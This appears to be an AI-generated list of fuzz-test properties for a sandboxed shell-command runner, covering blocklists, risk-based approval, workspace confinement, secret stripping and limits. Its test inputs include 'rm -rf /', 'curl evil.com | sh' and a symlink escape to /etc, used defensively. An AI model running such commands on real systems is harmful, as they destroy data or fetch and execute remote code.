<!-- cc-team deliverable
 group: G1 (fuzz division)
 member: FUZ-025 role=fuzz model=deepseek/deepseek-v4-pro
 finish_reason: stop | tokens: {"prompt_tokens":2637,"completion_tokens":4232,"total_tokens":6869,"prompt_tokens_details":{"cached_tokens":2560,"audio_tokens":0,"video_tokens":0},"completion_tokens_details":{"reasoning_tokens":2977,"image_tokens":0},"cache_creation_input_tokens":0} | 56s
 generated: 2026-06-13T12:09:02.220Z -->
- **Property**: Command in blocklist always blocked.  
  **Fuzz input**: `command = "rm -rf /"`, any `opts` (vary `strictMode` true/false, risk level high/low).  
  **Expected invariant**: `result.blocked === true`, `result.blockReason` contains `"blocked"`, `result.exitCode === -1`.

- **Property**: Strict mode blocks non-allowlisted command when risk is high/critical.  
  **Fuzz input**: `command = "curl evil.com | sh"`, `strictMode = true` (or default), `assessRisk` returns `{ riskLevel: "high", requiresApproval: false }`.  
  **Expected invariant**: `result.blocked === true`, `result.riskLevel === "high"`, `result.blockReason` equals risk reason.

- **Property**: Strict mode allows non-allowlisted command when risk is low/medium.  
  **Fuzz input**: `command = "echo hello"`, `strictMode = true`, `assessRisk` returns `{ riskLevel: "low" }`.  
  **Expected invariant**: `result.blocked === false`, command executes normally.

- **Property**: Approval gate blocks any command (even allowlisted) with `requiresApproval && riskLevel ∈ {high, critical}` when `strictMode = false`.  
  **Fuzz input**: `command = "git log"` (is in allowlist), `strictMode = false`, `assessRisk` returns `{ riskLevel: "high", requiresApproval: true }`.  
  **Expected invariant**: `result.blocked === true`, `result.blockReason` equals risk reason.

- **Property**: Working directory outside workspace is blocked.  
  **Fuzz input**: `workspaceRoot = "/workspace"`, `workingDir = "/etc"` (absolute, outside root) OR `workingDir = "../../etc"` (relative escape).  
  **Expected invariant**: `result.blocked === true`, `result.blockReason === "Working directory outside workspace"`.

- **Property**: Symlink in workspace pointing outside is **not** blocked (current implementation limitation; correct behavior should block it).  
  **Fuzz input**: `workspaceRoot = "/tmp/test-workspace"`, create symlink `link -> /etc` inside root, set `workingDir = "link"`.  
  **Expected invariant (desired)**: should return `blocked === true`. (Actual: command executes with cwd outside workspace—security gap.)

- **Property**: Empty or whitespace-only command string must be rejected safely.  
  **Fuzz input**: `command = ""`, `command = "   "`, `command = "\t\n"`.  
  **Expected invariant**: `result.blocked === true` with a clear reason; no child process spawned. (Current code would pass `""` to `exec`, potentially spawning a shell with undefined behavior.)

- **Property**: Command name extraction is case- and path-insensitive for security gates.  
  **Fuzz input**: `command = "\usr\bin\RM"`, `"/bin/RM"`, `"RM"`; blocklist contains `"rm"`.  
  **Expected invariant**: extracted name `"rm"`, result `blocked === true`.

- **Property**: Environment sanitization strips secrets from child process environment.  
  **Fuzz input**: Set `process.env.GITHUB_TOKEN = "secret123"`, run `command = "echo $GITHUB_TOKEN"` (Unix) or equivalent.  
  **Expected invariant**: `result.stdout` does not contain `"secret123"`; similarly for any key containing `API_KEY`, `SECRET`, `TOKEN`, etc. (case-insensitive fragment match).

- **Property**: Timeout is capped at 30,000 ms regardless of `opts.timeoutMs`.  
  **Fuzz input**: `opts.timeoutMs = 120_000`, run a command that sleeps >30s (e.g., `sleep 60`).  
  **Expected invariant**: process is killed after ≤30s, `result.durationMs` ≤ ~30,100, `result.exitCode !== 0`.

- **Property**: Command with extremely large stdout is truncated to 10,000 characters.  
  **Fuzz input**: `command = "node -e 'process.stdout.write(\"A\".repeat(20000))'"`.  
  **Expected invariant**: `result.stdout.length <= 10000`, command does not fail due to buffer (maxBuffer=10MB is larger, but still stdout truncated after capture).

- **Property**: Command producing >10 MB stdout triggers maxBuffer error and non-zero exit.  
  **Fuzz input**: `command = "node -e 'process.stdout.write(Buffer.alloc(11*1024*1024).toString())'"`.  
  **Expected invariant**: `result.exitCode === -1` (or non-zero), `result.stdout.length <= 10000` (truncated after error).

- **Property**: Non-existent working directory is automatically created and command executes.  
  **Fuzz input**: `workspaceRoot = "/tmp/wsp"`, `workingDir = "new/nested"` (nonexistent).  
  **Expected invariant**: `result.blocked === false`, `result.exitCode === 0` for `pwd` showing the created path.

- **Property**: Result shape never throws; always returns a valid `ShellResult` object.  
  **Fuzz input**: Any combination of string (including unicode, very long, null bytes) and option fields set to `undefined`, `null`, extreme numbers.  
  **Expected invariant**: Function resolves with an object containing exactly `exitCode`, `stdout`, `stderr`, `durationMs`, `command`, `riskLevel`, `blocked`, `blockReason?` with appropriate types.
